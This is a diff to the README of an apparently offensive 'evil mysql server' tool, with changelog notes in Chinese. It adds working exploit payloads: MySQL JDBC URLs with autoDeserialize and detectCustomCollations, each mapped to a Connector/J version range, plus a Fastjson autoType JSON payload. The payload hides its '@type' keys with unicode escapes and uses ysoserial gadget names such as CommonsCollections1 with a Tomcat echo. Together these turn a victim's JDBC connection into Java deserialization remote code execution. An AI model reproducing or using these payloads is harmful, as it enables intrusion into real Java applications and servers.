@@ -1,5 +1,41 @@
 # evil mysql server 
 
+## 20250301
+
+### 添加detectCustomCollations链
+
+```bash
+ - 5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=ysu_CommonsCollections1_EX-Tomcatecho
+ - 5.1.29-5.1.48：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=ysu_CommonsCollections1_EX-Tomcatecho
+ - 5.1.49：不可用
+ - 6.0.2-6.0.6：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=ysu_CommonsCollections1_EX-Tomcatecho
+ - 8.x.x ：不可用
+```
+
+```json
+{
+  "3ny8v4":{{
+      "\u0040\u0074\u0079\u0070\x65": "com.alibaba.fastjson.JSONObject",
+      "98ko27":
+      {
+        "\u0040\u0074\u0079\u0070\x65":"java.lang.AutoCloseable",
+        "\u0040\u0074\u0079\u0070\x65":"com.mysql.jdbc.JDBC4Connection",
+        "hostToConnectTo":"127.0.0.1",
+        "portToConnectTo":3306,
+        "info":{
+          "user":"ysu_Fastjson1_EX-TomcatEcho",
+          "password":"123456",
+          "useSSL":"false",
+          "autoDeserialize":"true",
+          "NUM_HOSTS":"1"
+        },
+        "databaseToConnectTo":"mysql",
+        "url":""
+      }
+  }:{}}
+}
+```
+
 ## 适配多个 ysoserial 工具 - 20240407
 
 
@@ -20,8 +56,8 @@ Y4er-ysoserial: y4ys
 
 ```
 ysu_CommonsCollections1_EX-Tomcatecho
+ysu_Fastjson1_EX-TomcatEcho
 y4ys_Fastjson1_CLASS:TomcatCmdEcho
-```
 
 ## 增加对su18-ysu的适配
 
